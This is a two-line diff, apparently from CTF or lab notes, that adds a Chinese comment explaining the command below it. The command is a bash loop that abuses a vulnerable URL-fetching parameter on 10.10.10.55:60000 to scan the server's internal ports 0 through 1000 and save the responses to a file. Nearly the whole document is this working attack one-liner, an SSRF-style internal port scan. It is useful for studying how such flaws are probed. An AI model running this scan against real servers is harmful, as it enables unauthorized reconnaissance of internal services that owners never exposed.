@@ -1,1 +1,2 @@
+###此命令的作用是在shell界面，利用存在文件包含漏洞的url，逐次访问服务器本地服务的0-1000端口的服务，
 for i in $(seq 0 1000);do echo "$i: ";curl -s http://10.10.10.55:60000/url.php?path=localhost:$i;done >result.txt
